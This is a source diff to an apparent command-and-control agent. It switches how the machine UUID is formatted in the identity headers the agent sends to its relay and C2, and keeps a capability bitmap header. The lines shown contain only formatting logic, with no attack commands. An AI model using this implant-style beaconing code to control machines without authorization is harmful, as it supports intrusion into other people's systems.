@@ -28,10 +28,9 @@ static BOOL WriteNumber(BinaryWriter &writer, UINT64 value)
  * @details Identity travels as HTTP headers. The relay
  * copies these headers into its agent events and /status; the C2 consumes them as
  * typed fields without parsing anything binary. Two formats must stay stable:
- *  - X-Agent-Machine-Uuid: the machine UUID's 16 bytes formatted as C# Guid.ToString()
- *    (Data1-3 little-endian/reversed, Data4-5 raw) — identical to what the C2 has
- *    historically keyed agents on, so machines registered by older builds keep
- *    their identity.
+ *  - X-Agent-Machine-Uuid: the machine UUID in its canonical RFC 9562 form
+ *    (8-4-4-4-12 lowercase) — the same value the host OS reports for the
+ *    machine, so operators can cross-reference host inventories directly.
  *  - X-Agent-Capabilities: the 8-byte capability-category bitmap as lowercase hex.
  *
  * @param info Populated SystemInfo (the same data the old Hello response carried).
@@ -49,31 +48,9 @@ static USIZE BuildIdentityHeaders(const SystemInfo &info, const CHAR *sessionKey
 
     BinaryWriter writer{Span<UINT8>((UINT8 *)out.Data(), out.Size())};
 
-    // Reconstruct the UUID's raw 16 bytes from its 64-bit halves.
-    UINT64 msb = info.MachineUUID.GetMostSignificantBits();
-    UINT64 lsb = info.MachineUUID.GetLeastSignificantBits();
-    UINT8 ub[16];
-    for (INT32 i = 0; i < 8; i++)
-        ub[i] = (UINT8)(msb >> (56 - 8 * i));
-    for (INT32 i = 0; i < 8; i++)
-        ub[8 + i] = (UINT8)(lsb >> (56 - 8 * i));
-
+    // Fixed 37-byte buffer (36 chars + NUL) — ToString cannot fail.
     CHAR uuid[37];
-    {
-        INT32 o = 0;
-        auto put = [&](UINT8 byte)
-        {
-            uuid[o++] = hex[byte >> 4];
-            uuid[o++] = hex[byte & 0xF];
-        };
-        put(ub[3]); put(ub[2]); put(ub[1]); put(ub[0]); uuid[o++] = '-';
-        put(ub[5]); put(ub[4]); uuid[o++] = '-';
-        put(ub[7]); put(ub[6]); uuid[o++] = '-';
-        for (INT32 i = 8; i < 12; i++) put(ub[i]);
-        uuid[o++] = '-';
-        for (INT32 i = 12; i < 16; i++) put(ub[i]);
-        uuid[o] = '\0';
-    }
+    (VOID)info.MachineUUID.ToString(Span<CHAR>(uuid, sizeof(uuid)));
 
     CapabilityMask mask = BuildCapabilityMask();
 
